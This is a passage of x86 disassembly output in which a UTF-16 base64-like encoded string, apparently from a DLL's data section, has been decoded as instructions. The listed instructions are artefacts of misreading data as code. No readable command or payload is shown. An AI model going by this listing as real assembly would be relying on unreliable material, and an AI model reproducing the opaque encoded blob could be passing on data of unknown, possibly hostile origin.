1000473a:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
1000473e:	54                   	push   %esp
1000473f:	00 45 00             	add    %al,0x0(%ebp)
10004742:	74 00                	je     0x10004744
10004744:	54                   	push   %esp
10004745:	00 57 00             	add    %dl,0x0(%edi)
10004748:	6d                   	insl   (%dx),%es:(%edi)
10004749:	00 4e 00             	add    %cl,0x0(%esi)
1000474c:	51                   	push   %ecx
1000474d:	00 62 00             	add    %ah,0x0(%edx)
10004750:	44                   	inc    %esp
10004751:	00 52 00             	add    %dl,0x0(%edx)
10004754:	58                   	pop    %eax
10004755:	00 63 00             	add    %ah,0x0(%ebx)
10004758:	6b 00 78             	imul   $0x78,(%eax),%eax
1000475b:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
1000475f:	00 31                	add    %dh,(%ecx)
10004761:	00 70 00             	add    %dh,0x0(%eax)
10004764:	6a 00                	push   $0x0
10004766:	59                   	pop    %ecx
10004767:	00 31                	add    %dh,(%ecx)
10004769:	00 68 00             	add    %ch,0x0(%eax)
1000476c:	47                   	inc    %edi
1000476d:	00 55 00             	add    %dl,0x0(%ebp)
10004770:	47                   	inc    %edi
10004771:	00 77 00             	add    %dh,0x0(%edi)
10004774:	30 00                	xor    %al,(%eax)
10004776:	56                   	push   %esi
10004777:	00 33                	add    %dh,(%ebx)
10004779:	00 4a 00             	add    %cl,0x0(%edx)
1000477c:	4d                   	dec    %ebp
1000477d:	00 53 00             	add    %dl,0x0(%ebx)
10004780:	31 00                	xor    %eax,(%eax)
10004782:	4e                   	dec    %esi
10004783:	00 61 00             	add    %ah,0x0(%ecx)
10004786:	59                   	pop    %ecx
10004787:	00 31                	add    %dh,(%ecx)
10004789:	00 42 00             	add    %al,0x0(%edx)
1000478c:	73 00                	jae    0x1000478e
1000478e:	4e                   	dec    %esi
1000478f:	00 46 00             	add    %al,0x0(%esi)
10004792:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004796:	54                   	push   %esp
10004797:	00 45 00             	add    %al,0x0(%ebp)
1000479a:	74 00                	je     0x1000479c
1000479c:	54                   	push   %esp
1000479d:	00 57 00             	add    %dl,0x0(%edi)
100047a0:	6d                   	insl   (%dx),%es:(%edi)
100047a1:	00 4e 00             	add    %cl,0x0(%esi)
100047a4:	6b 00 63             	imul   $0x63,(%eax),%eax
100047a7:	00 47 00             	add    %al,0x0(%edi)
100047aa:	4a                   	dec    %edx
100047ab:	00 51 00             	add    %dl,0x0(%ecx)
100047ae:	62 00                	bound  %eax,(%eax)
100047b0:	44                   	inc    %esp
100047b1:	00 52 00             	add    %dl,0x0(%edx)
100047b4:	58                   	pop    %eax
100047b5:	00 63 00             	add    %ah,0x0(%ebx)
100047b8:	6b 00 78             	imul   $0x78,(%eax),%eax
100047bb:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
100047bf:	00 31                	add    %dh,(%ecx)
100047c1:	00 70 00             	add    %dh,0x0(%eax)
100047c4:	6a 00                	push   $0x0
100047c6:	55                   	push   %ebp
100047c7:	00 47 00             	add    %al,0x0(%edi)
100047ca:	77 00                	ja     0x100047cc
100047cc:	30 00                	xor    %al,(%eax)
100047ce:	56                   	push   %esi
100047cf:	00 33                	add    %dh,(%ebx)
100047d1:	00 4a 00             	add    %cl,0x0(%edx)
100047d4:	4d                   	dec    %ebp
100047d5:	00 53 00             	add    %dl,0x0(%ebx)
100047d8:	31 00                	xor    %eax,(%eax)
100047da:	4e                   	dec    %esi
100047db:	00 61 00             	add    %ah,0x0(%ecx)
100047de:	59                   	pop    %ecx
100047df:	00 32                	add    %dh,(%edx)
100047e1:	00 31                	add    %dh,(%ecx)
100047e3:	00 53 00             	add    %dl,0x0(%ebx)
100047e6:	64 00 6c 00 42       	add    %ch,%fs:0x42(%eax,%eax,1)
100047eb:	00 73 00             	add    %dh,0x0(%ebx)
100047ee:	4e                   	dec    %esi
100047ef:	00 46 00             	add    %al,0x0(%esi)
100047f2:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
100047f6:	54                   	push   %esp
100047f7:	00 45 00             	add    %al,0x0(%ebp)
100047fa:	74 00                	je     0x100047fc
100047fc:	54                   	push   %esp
100047fd:	00 57 00             	add    %dl,0x0(%edi)
10004800:	6d                   	insl   (%dx),%es:(%edi)
10004801:	00 4e 00             	add    %cl,0x0(%esi)
10004804:	51                   	push   %ecx
10004805:	00 62 00             	add    %ah,0x0(%edx)
10004808:	44                   	inc    %esp
10004809:	00 52 00             	add    %dl,0x0(%edx)
1000480c:	58                   	pop    %eax
1000480d:	00 63 00             	add    %ah,0x0(%ebx)
10004810:	6b 00 78             	imul   $0x78,(%eax),%eax
10004813:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004817:	00 31                	add    %dh,(%ecx)
10004819:	00 70 00             	add    %dh,0x0(%eax)
1000481c:	6a 00                	push   $0x0
1000481e:	5a                   	pop    %edx
1000481f:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
10004823:	00 4f 00             	add    %cl,0x0(%edi)
10004826:	55                   	push   %ebp
10004827:	00 47 00             	add    %al,0x0(%edi)
1000482a:	77 00                	ja     0x1000482c
1000482c:	30 00                	xor    %al,(%eax)
1000482e:	56                   	push   %esi
1000482f:	00 33                	add    %dh,(%ebx)
10004831:	00 4a 00             	add    %cl,0x0(%edx)
10004834:	4d                   	dec    %ebp
10004835:	00 53 00             	add    %dl,0x0(%ebx)
10004838:	31 00                	xor    %eax,(%eax)
1000483a:	4e                   	dec    %esi
1000483b:	00 61 00             	add    %ah,0x0(%ecx)
1000483e:	59                   	pop    %ecx
1000483f:	00 31                	add    %dh,(%ecx)
10004841:	00 42 00             	add    %al,0x0(%edx)
10004844:	73 00                	jae    0x10004846
10004846:	4e                   	dec    %esi
10004847:	00 46 00             	add    %al,0x0(%esi)
1000484a:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
1000484e:	54                   	push   %esp
1000484f:	00 45 00             	add    %al,0x0(%ebp)
10004852:	74 00                	je     0x10004854
10004854:	54                   	push   %esp
10004855:	00 57 00             	add    %dl,0x0(%edi)
10004858:	6d                   	insl   (%dx),%es:(%edi)
10004859:	00 4e 00             	add    %cl,0x0(%esi)
1000485c:	6a 00                	push   $0x0
1000485e:	57                   	push   %edi
1000485f:	00 45 00             	add    %al,0x0(%ebp)
10004862:	56                   	push   %esi
10004863:	00 51 00             	add    %dl,0x0(%ecx)
10004866:	62 00                	bound  %eax,(%eax)
10004868:	44                   	inc    %esp
10004869:	00 52 00             	add    %dl,0x0(%edx)
1000486c:	58                   	pop    %eax
1000486d:	00 63 00             	add    %ah,0x0(%ebx)
10004870:	6b 00 78             	imul   $0x78,(%eax),%eax
10004873:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004877:	00 31                	add    %dh,(%ecx)
10004879:	00 70 00             	add    %dh,0x0(%eax)
1000487c:	6a 00                	push   $0x0
1000487e:	55                   	push   %ebp
1000487f:	00 47 00             	add    %al,0x0(%edi)
10004882:	77 00                	ja     0x10004884
10004884:	30 00                	xor    %al,(%eax)
10004886:	56                   	push   %esi
10004887:	00 33                	add    %dh,(%ebx)
10004889:	00 4a 00             	add    %cl,0x0(%edx)
1000488c:	4d                   	dec    %ebp
1000488d:	00 53 00             	add    %dl,0x0(%ebx)
10004890:	31 00                	xor    %eax,(%eax)
10004892:	4e                   	dec    %esi
10004893:	00 61 00             	add    %ah,0x0(%ecx)
10004896:	59                   	pop    %ecx
10004897:	00 7a 00             	add    %bh,0x0(%edx)
1000489a:	46                   	inc    %esi
1000489b:	00 77 00             	add    %dh,0x0(%edi)
1000489e:	57                   	push   %edi
1000489f:	00 56 00             	add    %dl,0x0(%esi)
100048a2:	42                   	inc    %edx
100048a3:	00 73 00             	add    %dh,0x0(%ebx)
100048a6:	4e                   	dec    %esi
100048a7:	00 46 00             	add    %al,0x0(%esi)
100048aa:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
100048ae:	54                   	push   %esp
100048af:	00 45 00             	add    %al,0x0(%ebp)
100048b2:	74 00                	je     0x100048b4
100048b4:	54                   	push   %esp
100048b5:	00 57 00             	add    %dl,0x0(%edi)
100048b8:	6d                   	insl   (%dx),%es:(%edi)
100048b9:	00 4e 00             	add    %cl,0x0(%esi)
100048bc:	51                   	push   %ecx
100048bd:	00 62 00             	add    %ah,0x0(%edx)
100048c0:	44                   	inc    %esp
100048c1:	00 52 00             	add    %dl,0x0(%edx)
100048c4:	58                   	pop    %eax
100048c5:	00 63 00             	add    %ah,0x0(%ebx)
100048c8:	6b 00 78             	imul   $0x78,(%eax),%eax
100048cb:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
100048cf:	00 31                	add    %dh,(%ecx)
100048d1:	00 70 00             	add    %dh,0x0(%eax)
100048d4:	6a 00                	push   $0x0
100048d6:	4d                   	dec    %ebp
100048d7:	00 30                	add    %dh,(%eax)
100048d9:	00 70 00             	add    %dh,0x0(%eax)
100048dc:	32 00                	xor    (%eax),%al
100048de:	55                   	push   %ebp
100048df:	00 47 00             	add    %al,0x0(%edi)
100048e2:	77 00                	ja     0x100048e4
100048e4:	30 00                	xor    %al,(%eax)
100048e6:	56                   	push   %esi
100048e7:	00 33                	add    %dh,(%ebx)
100048e9:	00 4a 00             	add    %cl,0x0(%edx)
100048ec:	4d                   	dec    %ebp
100048ed:	00 53 00             	add    %dl,0x0(%ebx)
100048f0:	31 00                	xor    %eax,(%eax)
100048f2:	4e                   	dec    %esi
100048f3:	00 61 00             	add    %ah,0x0(%ecx)
100048f6:	59                   	pop    %ecx
100048f7:	00 31                	add    %dh,(%ecx)
100048f9:	00 42 00             	add    %al,0x0(%edx)
100048fc:	73 00                	jae    0x100048fe
100048fe:	4e                   	dec    %esi
100048ff:	00 46 00             	add    %al,0x0(%esi)
10004902:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004906:	54                   	push   %esp
10004907:	00 45 00             	add    %al,0x0(%ebp)
1000490a:	74 00                	je     0x1000490c
1000490c:	54                   	push   %esp
1000490d:	00 57 00             	add    %dl,0x0(%edi)
10004910:	6d                   	insl   (%dx),%es:(%edi)
10004911:	00 4e 00             	add    %cl,0x0(%esi)
10004914:	6a 00                	push   $0x0
10004916:	4d                   	dec    %ebp
10004917:	00 6a 00             	add    %ch,0x0(%edx)
1000491a:	6c                   	insb   (%dx),%es:(%edi)
1000491b:	00 51 00             	add    %dl,0x0(%ecx)
1000491e:	62 00                	bound  %eax,(%eax)
10004920:	44                   	inc    %esp
10004921:	00 52 00             	add    %dl,0x0(%edx)
10004924:	58                   	pop    %eax
10004925:	00 63 00             	add    %ah,0x0(%ebx)
10004928:	6b 00 78             	imul   $0x78,(%eax),%eax
1000492b:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
1000492f:	00 31                	add    %dh,(%ecx)
10004931:	00 70 00             	add    %dh,0x0(%eax)
10004934:	6a 00                	push   $0x0
10004936:	55                   	push   %ebp
10004937:	00 47 00             	add    %al,0x0(%edi)
1000493a:	77 00                	ja     0x1000493c
1000493c:	30 00                	xor    %al,(%eax)
1000493e:	56                   	push   %esi
1000493f:	00 33                	add    %dh,(%ebx)
10004941:	00 4a 00             	add    %cl,0x0(%edx)
10004944:	4d                   	dec    %ebp
10004945:	00 53 00             	add    %dl,0x0(%ebx)
10004948:	31 00                	xor    %eax,(%eax)
1000494a:	4e                   	dec    %esi
1000494b:	00 61 00             	add    %ah,0x0(%ecx)
1000494e:	59                   	pop    %ecx
1000494f:	00 32                	add    %dh,(%edx)
10004951:	00 31                	add    %dh,(%ecx)
10004953:	00 6b 00             	add    %ch,0x0(%ebx)
10004956:	51                   	push   %ecx
10004957:	00 31                	add    %dh,(%ecx)
10004959:	00 42 00             	add    %al,0x0(%edx)
1000495c:	73 00                	jae    0x1000495e
1000495e:	4e                   	dec    %esi
1000495f:	00 46 00             	add    %al,0x0(%esi)
10004962:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004966:	54                   	push   %esp
10004967:	00 45 00             	add    %al,0x0(%ebp)
1000496a:	74 00                	je     0x1000496c
1000496c:	54                   	push   %esp
1000496d:	00 57 00             	add    %dl,0x0(%edi)
10004970:	6d                   	insl   (%dx),%es:(%edi)
10004971:	00 4e 00             	add    %cl,0x0(%esi)
10004974:	51                   	push   %ecx
10004975:	00 62 00             	add    %ah,0x0(%edx)
10004978:	44                   	inc    %esp
10004979:	00 52 00             	add    %dl,0x0(%edx)
1000497c:	58                   	pop    %eax
1000497d:	00 63 00             	add    %ah,0x0(%ebx)
10004980:	6b 00 78             	imul   $0x78,(%eax),%eax
10004983:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004987:	00 31                	add    %dh,(%ecx)
10004989:	00 70 00             	add    %dh,0x0(%eax)
1000498c:	6a 00                	push   $0x0
1000498e:	4e                   	dec    %esi
1000498f:	00 55 00             	add    %dl,0x0(%ebp)
10004992:	39 00                	cmp    %eax,(%eax)
10004994:	53                   	push   %ebx
10004995:	00 55 00             	add    %dl,0x0(%ebp)
10004998:	47                   	inc    %edi
10004999:	00 77 00             	add    %dh,0x0(%edi)
1000499c:	30 00                	xor    %al,(%eax)
1000499e:	56                   	push   %esi
1000499f:	00 33                	add    %dh,(%ebx)
100049a1:	00 4a 00             	add    %cl,0x0(%edx)
100049a4:	4d                   	dec    %ebp
100049a5:	00 53 00             	add    %dl,0x0(%ebx)
100049a8:	31 00                	xor    %eax,(%eax)
100049aa:	4e                   	dec    %esi
100049ab:	00 61 00             	add    %ah,0x0(%ecx)
100049ae:	59                   	pop    %ecx
100049af:	00 31                	add    %dh,(%ecx)
100049b1:	00 42 00             	add    %al,0x0(%edx)
100049b4:	73 00                	jae    0x100049b6
100049b6:	4e                   	dec    %esi
100049b7:	00 46 00             	add    %al,0x0(%esi)
100049ba:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
100049be:	54                   	push   %esp
100049bf:	00 45 00             	add    %al,0x0(%ebp)
100049c2:	74 00                	je     0x100049c4
100049c4:	54                   	push   %esp
100049c5:	00 57 00             	add    %dl,0x0(%edi)
100049c8:	6d                   	insl   (%dx),%es:(%edi)
100049c9:	00 4e 00             	add    %cl,0x0(%esi)
100049cc:	57                   	push   %edi
100049cd:	00 55 00             	add    %dl,0x0(%ebp)
100049d0:	6d                   	insl   (%dx),%es:(%edi)
100049d1:	00 4e 00             	add    %cl,0x0(%esi)
100049d4:	51                   	push   %ecx
100049d5:	00 62 00             	add    %ah,0x0(%edx)
100049d8:	44                   	inc    %esp
100049d9:	00 52 00             	add    %dl,0x0(%edx)
100049dc:	58                   	pop    %eax
100049dd:	00 63 00             	add    %ah,0x0(%ebx)
100049e0:	6b 00 78             	imul   $0x78,(%eax),%eax
100049e3:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
100049e7:	00 31                	add    %dh,(%ecx)
100049e9:	00 70 00             	add    %dh,0x0(%eax)
100049ec:	6a 00                	push   $0x0
100049ee:	55                   	push   %ebp
100049ef:	00 47 00             	add    %al,0x0(%edi)
100049f2:	77 00                	ja     0x100049f4
100049f4:	30 00                	xor    %al,(%eax)
100049f6:	56                   	push   %esi
100049f7:	00 33                	add    %dh,(%ebx)
100049f9:	00 4a 00             	add    %cl,0x0(%edx)
100049fc:	4d                   	dec    %ebp
100049fd:	00 53 00             	add    %dl,0x0(%ebx)
10004a00:	31 00                	xor    %eax,(%eax)
10004a02:	4e                   	dec    %esi
10004a03:	00 61 00             	add    %ah,0x0(%ecx)
10004a06:	59                   	pop    %ecx
10004a07:	00 31                	add    %dh,(%ecx)
10004a09:	00 68 00             	add    %ch,0x0(%eax)
10004a0c:	46                   	inc    %esi
10004a0d:	00 57 00             	add    %dl,0x0(%edi)
10004a10:	6c                   	insb   (%dx),%es:(%edi)
10004a11:	00 42 00             	add    %al,0x0(%edx)
10004a14:	73 00                	jae    0x10004a16
10004a16:	4e                   	dec    %esi
10004a17:	00 46 00             	add    %al,0x0(%esi)
10004a1a:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004a1e:	54                   	push   %esp
10004a1f:	00 45 00             	add    %al,0x0(%ebp)
10004a22:	74 00                	je     0x10004a24
10004a24:	54                   	push   %esp
10004a25:	00 57 00             	add    %dl,0x0(%edi)
10004a28:	6d                   	insl   (%dx),%es:(%edi)
10004a29:	00 4e 00             	add    %cl,0x0(%esi)
10004a2c:	51                   	push   %ecx
10004a2d:	00 62 00             	add    %ah,0x0(%edx)
10004a30:	44                   	inc    %esp
10004a31:	00 52 00             	add    %dl,0x0(%edx)
10004a34:	58                   	pop    %eax
10004a35:	00 63 00             	add    %ah,0x0(%ebx)
10004a38:	6b 00 78             	imul   $0x78,(%eax),%eax
10004a3b:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004a3f:	00 31                	add    %dh,(%ecx)
10004a41:	00 70 00             	add    %dh,0x0(%eax)
10004a44:	6a 00                	push   $0x0
10004a46:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10004a4a:	6c                   	insb   (%dx),%es:(%edi)
10004a4b:	00 58 00             	add    %bl,0x0(%eax)
10004a4e:	55                   	push   %ebp
10004a4f:	00 47 00             	add    %al,0x0(%edi)
10004a52:	77 00                	ja     0x10004a54
10004a54:	30 00                	xor    %al,(%eax)
10004a56:	56                   	push   %esi
10004a57:	00 33                	add    %dh,(%ebx)
10004a59:	00 4a 00             	add    %cl,0x0(%edx)
10004a5c:	4d                   	dec    %ebp
10004a5d:	00 53 00             	add    %dl,0x0(%ebx)
10004a60:	31 00                	xor    %eax,(%eax)
10004a62:	4e                   	dec    %esi
10004a63:	00 61 00             	add    %ah,0x0(%ecx)
10004a66:	59                   	pop    %ecx
10004a67:	00 31                	add    %dh,(%ecx)
10004a69:	00 42 00             	add    %al,0x0(%edx)
10004a6c:	73 00                	jae    0x10004a6e
10004a6e:	4e                   	dec    %esi
10004a6f:	00 46 00             	add    %al,0x0(%esi)
10004a72:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004a76:	54                   	push   %esp
10004a77:	00 45 00             	add    %al,0x0(%ebp)
10004a7a:	74 00                	je     0x10004a7c
10004a7c:	54                   	push   %esp
10004a7d:	00 57 00             	add    %dl,0x0(%edi)
10004a80:	6d                   	insl   (%dx),%es:(%edi)
10004a81:	00 4d 00             	add    %cl,0x0(%ebp)
10004a84:	78 00                	js     0x10004a86
10004a86:	62 00                	bound  %eax,(%eax)
10004a88:	47                   	inc    %edi
10004a89:	00 52 00             	add    %dl,0x0(%edx)
10004a8c:	51                   	push   %ecx
10004a8d:	00 62 00             	add    %ah,0x0(%edx)
10004a90:	44                   	inc    %esp
10004a91:	00 52 00             	add    %dl,0x0(%edx)
10004a94:	58                   	pop    %eax
10004a95:	00 63 00             	add    %ah,0x0(%ebx)
10004a98:	6b 00 78             	imul   $0x78,(%eax),%eax
10004a9b:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004a9f:	00 31                	add    %dh,(%ecx)
10004aa1:	00 70 00             	add    %dh,0x0(%eax)
10004aa4:	6a 00                	push   $0x0
10004aa6:	55                   	push   %ebp
10004aa7:	00 47 00             	add    %al,0x0(%edi)
10004aaa:	77 00                	ja     0x10004aac
10004aac:	30 00                	xor    %al,(%eax)
10004aae:	56                   	push   %esi
10004aaf:	00 33                	add    %dh,(%ebx)
10004ab1:	00 4a 00             	add    %cl,0x0(%edx)
10004ab4:	4d                   	dec    %ebp
10004ab5:	00 53 00             	add    %dl,0x0(%ebx)
10004ab8:	31 00                	xor    %eax,(%eax)
10004aba:	4e                   	dec    %esi
10004abb:	00 61 00             	add    %ah,0x0(%ecx)
10004abe:	59                   	pop    %ecx
10004abf:	00 7a 00             	add    %bh,0x0(%edx)
10004ac2:	49                   	dec    %ecx
10004ac3:	00 35 00 65 00 56    	add    %dh,0x56006500
10004ac9:	00 42 00             	add    %al,0x0(%edx)
10004acc:	73 00                	jae    0x10004ace
10004ace:	4e                   	dec    %esi
10004acf:	00 46 00             	add    %al,0x0(%esi)
10004ad2:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004ad6:	54                   	push   %esp
10004ad7:	00 45 00             	add    %al,0x0(%ebp)
10004ada:	74 00                	je     0x10004adc
10004adc:	54                   	push   %esp
10004add:	00 57 00             	add    %dl,0x0(%edi)
10004ae0:	6d                   	insl   (%dx),%es:(%edi)
10004ae1:	00 4e 00             	add    %cl,0x0(%esi)
10004ae4:	51                   	push   %ecx
10004ae5:	00 62 00             	add    %ah,0x0(%edx)
10004ae8:	44                   	inc    %esp
10004ae9:	00 52 00             	add    %dl,0x0(%edx)
10004aec:	58                   	pop    %eax
10004aed:	00 63 00             	add    %ah,0x0(%ebx)
10004af0:	6b 00 78             	imul   $0x78,(%eax),%eax
10004af3:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004af7:	00 31                	add    %dh,(%ecx)
10004af9:	00 70 00             	add    %dh,0x0(%eax)
10004afc:	6a 00                	push   $0x0
10004afe:	59                   	pop    %ecx
10004aff:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004b03:	00 34 00             	add    %dh,(%eax,%eax,1)
10004b06:	55                   	push   %ebp
10004b07:	00 47 00             	add    %al,0x0(%edi)
10004b0a:	77 00                	ja     0x10004b0c
10004b0c:	30 00                	xor    %al,(%eax)
10004b0e:	56                   	push   %esi
10004b0f:	00 33                	add    %dh,(%ebx)
10004b11:	00 4a 00             	add    %cl,0x0(%edx)
10004b14:	4d                   	dec    %ebp
10004b15:	00 53 00             	add    %dl,0x0(%ebx)
10004b18:	31 00                	xor    %eax,(%eax)
10004b1a:	4e                   	dec    %esi
10004b1b:	00 61 00             	add    %ah,0x0(%ecx)
10004b1e:	59                   	pop    %ecx
10004b1f:	00 31                	add    %dh,(%ecx)
10004b21:	00 42 00             	add    %al,0x0(%edx)
10004b24:	73 00                	jae    0x10004b26
10004b26:	4e                   	dec    %esi
10004b27:	00 46 00             	add    %al,0x0(%esi)
10004b2a:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004b2e:	54                   	push   %esp
10004b2f:	00 45 00             	add    %al,0x0(%ebp)
10004b32:	74 00                	je     0x10004b34
10004b34:	54                   	push   %esp
10004b35:	00 57 00             	add    %dl,0x0(%edi)
10004b38:	6d                   	insl   (%dx),%es:(%edi)
10004b39:	00 4e 00             	add    %cl,0x0(%esi)
10004b3c:	6a 00                	push   $0x0
10004b3e:	5a                   	pop    %edx
10004b3f:	00 47 00             	add    %al,0x0(%edi)
10004b42:	70 00                	jo     0x10004b44
10004b44:	51                   	push   %ecx
10004b45:	00 62 00             	add    %ah,0x0(%edx)
10004b48:	44                   	inc    %esp
10004b49:	00 52 00             	add    %dl,0x0(%edx)
10004b4c:	58                   	pop    %eax
10004b4d:	00 63 00             	add    %ah,0x0(%ebx)
10004b50:	6b 00 78             	imul   $0x78,(%eax),%eax
10004b53:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004b57:	00 31                	add    %dh,(%ecx)
10004b59:	00 70 00             	add    %dh,0x0(%eax)
10004b5c:	6a 00                	push   $0x0
10004b5e:	55                   	push   %ebp
10004b5f:	00 47 00             	add    %al,0x0(%edi)
10004b62:	77 00                	ja     0x10004b64
10004b64:	30 00                	xor    %al,(%eax)
10004b66:	56                   	push   %esi
10004b67:	00 33                	add    %dh,(%ebx)
10004b69:	00 4a 00             	add    %cl,0x0(%edx)
10004b6c:	4d                   	dec    %ebp
10004b6d:	00 53 00             	add    %dl,0x0(%ebx)
10004b70:	31 00                	xor    %eax,(%eax)
10004b72:	4e                   	dec    %esi
10004b73:	00 61 00             	add    %ah,0x0(%ecx)
10004b76:	59                   	pop    %ecx
10004b77:	00 31                	add    %dh,(%ecx)
10004b79:	00 46 00             	add    %al,0x0(%esi)
10004b7c:	31 00                	xor    %eax,(%eax)
10004b7e:	54                   	push   %esp
10004b7f:	00 56 00             	add    %dl,0x0(%esi)
10004b82:	42                   	inc    %edx
10004b83:	00 73 00             	add    %dh,0x0(%ebx)
10004b86:	4e                   	dec    %esi
10004b87:	00 46 00             	add    %al,0x0(%esi)
10004b8a:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004b8e:	54                   	push   %esp
10004b8f:	00 45 00             	add    %al,0x0(%ebp)
10004b92:	74 00                	je     0x10004b94
10004b94:	54                   	push   %esp
10004b95:	00 57 00             	add    %dl,0x0(%edi)
10004b98:	6d                   	insl   (%dx),%es:(%edi)
10004b99:	00 4e 00             	add    %cl,0x0(%esi)
10004b9c:	51                   	push   %ecx
10004b9d:	00 62 00             	add    %ah,0x0(%edx)
10004ba0:	44                   	inc    %esp
10004ba1:	00 52 00             	add    %dl,0x0(%edx)
10004ba4:	58                   	pop    %eax
10004ba5:	00 63 00             	add    %ah,0x0(%ebx)
10004ba8:	6b 00 78             	imul   $0x78,(%eax),%eax
10004bab:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004baf:	00 31                	add    %dh,(%ecx)
10004bb1:	00 70 00             	add    %dh,0x0(%eax)
10004bb4:	6a 00                	push   $0x0
10004bb6:	51                   	push   %ecx
10004bb7:	00 7a 00             	add    %bh,0x0(%edx)
10004bba:	52                   	push   %edx
10004bbb:	00 36                	add    %dh,(%esi)
10004bbd:	00 55 00             	add    %dl,0x0(%ebp)
10004bc0:	47                   	inc    %edi
10004bc1:	00 77 00             	add    %dh,0x0(%edi)
10004bc4:	30 00                	xor    %al,(%eax)
10004bc6:	56                   	push   %esi
10004bc7:	00 33                	add    %dh,(%ebx)
10004bc9:	00 4a 00             	add    %cl,0x0(%edx)
10004bcc:	4d                   	dec    %ebp
10004bcd:	00 53 00             	add    %dl,0x0(%ebx)
10004bd0:	31 00                	xor    %eax,(%eax)
10004bd2:	4e                   	dec    %esi
10004bd3:	00 61 00             	add    %ah,0x0(%ecx)
10004bd6:	59                   	pop    %ecx
10004bd7:	00 31                	add    %dh,(%ecx)
10004bd9:	00 42 00             	add    %al,0x0(%edx)
10004bdc:	73 00                	jae    0x10004bde
10004bde:	4e                   	dec    %esi
10004bdf:	00 46 00             	add    %al,0x0(%esi)
10004be2:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004be6:	54                   	push   %esp
10004be7:	00 45 00             	add    %al,0x0(%ebp)
10004bea:	74 00                	je     0x10004bec
10004bec:	54                   	push   %esp
10004bed:	00 57 00             	add    %dl,0x0(%edi)
10004bf0:	6d                   	insl   (%dx),%es:(%edi)
10004bf1:	00 4e 00             	add    %cl,0x0(%esi)
10004bf4:	4e                   	dec    %esi
10004bf5:	00 52 00             	add    %dl,0x0(%edx)
10004bf8:	45                   	inc    %ebp
10004bf9:	00 31                	add    %dh,(%ecx)
10004bfb:	00 51 00             	add    %dl,0x0(%ecx)
10004bfe:	62 00                	bound  %eax,(%eax)
10004c00:	44                   	inc    %esp
10004c01:	00 52 00             	add    %dl,0x0(%edx)
10004c04:	58                   	pop    %eax
10004c05:	00 63 00             	add    %ah,0x0(%ebx)
10004c08:	6b 00 78             	imul   $0x78,(%eax),%eax
10004c0b:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004c0f:	00 31                	add    %dh,(%ecx)
10004c11:	00 70 00             	add    %dh,0x0(%eax)
10004c14:	6a 00                	push   $0x0
10004c16:	55                   	push   %ebp
10004c17:	00 47 00             	add    %al,0x0(%edi)
10004c1a:	77 00                	ja     0x10004c1c
10004c1c:	30 00                	xor    %al,(%eax)
10004c1e:	56                   	push   %esi
10004c1f:	00 33                	add    %dh,(%ebx)
10004c21:	00 4a 00             	add    %cl,0x0(%edx)
10004c24:	4d                   	dec    %ebp
10004c25:	00 53 00             	add    %dl,0x0(%ebx)
10004c28:	31 00                	xor    %eax,(%eax)
10004c2a:	4e                   	dec    %esi
10004c2b:	00 61 00             	add    %ah,0x0(%ecx)
10004c2e:	59                   	pop    %ecx
10004c2f:	00 33                	add    %dh,(%ebx)
10004c31:	00 68 00             	add    %ch,0x0(%eax)
10004c34:	50                   	push   %eax
10004c35:	00 56 00             	add    %dl,0x0(%esi)
10004c38:	6c                   	insb   (%dx),%es:(%edi)
10004c39:	00 42 00             	add    %al,0x0(%edx)
10004c3c:	73 00                	jae    0x10004c3e
10004c3e:	4e                   	dec    %esi
10004c3f:	00 46 00             	add    %al,0x0(%esi)
10004c42:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
10004c46:	54                   	push   %esp
10004c47:	00 45 00             	add    %al,0x0(%ebp)
10004c4a:	74 00                	je     0x10004c4c
10004c4c:	54                   	push   %esp
10004c4d:	00 57 00             	add    %dl,0x0(%edi)
10004c50:	6d                   	insl   (%dx),%es:(%edi)
10004c51:	00 4e 00             	add    %cl,0x0(%esi)
10004c54:	51                   	push   %ecx
10004c55:	00 62 00             	add    %ah,0x0(%edx)
10004c58:	44                   	inc    %esp
10004c59:	00 52 00             	add    %dl,0x0(%edx)
10004c5c:	58                   	pop    %eax
10004c5d:	00 63 00             	add    %ah,0x0(%ebx)
10004c60:	6b 00 78             	imul   $0x78,(%eax),%eax
10004c63:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004c67:	00 31                	add    %dh,(%ecx)
10004c69:	00 70 00             	add    %dh,0x0(%eax)
10004c6c:	6a 00                	push   $0x0
10004c6e:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004c72:	4e                   	dec    %esi
10004c73:	00 51 00             	add    %dl,0x0(%ecx)
10004c76:	62 00                	bound  %eax,(%eax)
10004c78:	44                   	inc    %esp
10004c79:	00 52 00             	add    %dl,0x0(%edx)
10004c7c:	58                   	pop    %eax
10004c7d:	00 63 00             	add    %ah,0x0(%ebx)
